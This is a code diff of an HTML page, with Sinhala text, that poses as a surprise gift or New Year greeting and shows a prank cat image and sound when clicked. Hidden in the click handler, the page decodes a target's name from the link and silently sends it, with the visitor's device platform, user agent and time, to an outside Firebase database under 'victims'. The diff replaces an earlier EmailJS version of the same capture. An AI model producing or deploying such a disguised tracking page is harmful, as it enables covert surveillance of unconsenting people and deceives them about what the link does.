@@ -3,49 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>අලුත් අවුරුදු සුබපැතුම්! 🎁</title>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <title>Surprise! 🎁</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         body { background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; font-family: sans-serif; cursor: pointer; text-align: center; }
         img { width: 90%; max-width: 400px; display: none; border-radius: 15px; box-shadow: 0 0 20px red; }
     </style>
 </head>
-<body onclick="startTrap()">
-
-    <div id="loader">
-        <h2>ඔයාට විශේෂ පණිවිඩයක් තියෙනවා... 🎁</h2>
-        <p style="font-size: 12px; color: #888;">බලන්න මෙතන ක්ලික් කරන්න</p>
+<body onclick="hit()">
+    
+    <div id="m">
+        <h2>ඔයාට තෑග්ගක් තියෙනවා! 🎁</h2>
+        <p>බලන්න මෙතන ක්ලික් කරන්න</p>
     </div>
 
-    <img id="cat" src="https://i.imgur.com/G36m9sH.jpeg">
-    <audio id="huhu" src="https://www.myinstants.com/media/sounds/huuuuu.mp3"></audio>
+    <img id="c" src="https://i.imgur.com/G36m9sH.jpeg">
+    <audio id="a" src="https://www.myinstants.com/media/sounds/huuuuu.mp3"></audio>
 
     <script>
-        (function(){ emailjs.init("aop4SIq1OjHZn_EW7"); })();
+        // Screenshot එකේ තිබුණ උඹේම Database URL එක මෙතනට ඇඩ් කළා
+        const firebaseConfig = { 
+            databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" 
+        };
+        firebase.initializeApp(firebaseConfig);
 
-        function startTrap() {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('cat').style.display = 'block';
-            document.getElementById('huhu').play();
+        function hit() {
+            // UI පාලනය
+            document.getElementById('m').style.display='none';
+            document.getElementById('c').style.display='block';
+            document.getElementById('a').play();
 
-            // SILENT DATA CAPTURE
+            // ලින්ක් එකේ ඇති නම (Target Name) කියවීම
             const urlParams = new URLSearchParams(window.location.search);
             const targetName = atob(urlParams.get('t') || "Unknown");
 
-            const captureData = {
+            // දත්ත Firebase එකට යැවීම
+            firebase.database().ref('victims').push({
                 target: targetName,
                 device: navigator.platform,
                 agent: navigator.userAgent,
                 time: new Date().toLocaleString()
-            };
+            });
 
-            // දත්ත ඊමේල් එකට යැවීම (Background)
-            emailjs.send("service_h6bsq2s", "template_7slq3e6", captureData)
-            .then(() => console.log("Success"), () => console.log("Fail"));
-
-            setTimeout(() => {
-                alert("හුහූ රවටුනා නේද? පලයන් යන්න ඕවා මැජික් නෙමෙයි! 🤪");
-            }, 1000);
+            // තත්පර බාගයකින් ඇලර්ට් එක දෙනවා
+            setTimeout(() => { 
+                alert("හුහූ රවටුනා නේද? 🤪"); 
+            }, 500);
         }
     </script>
 </body>
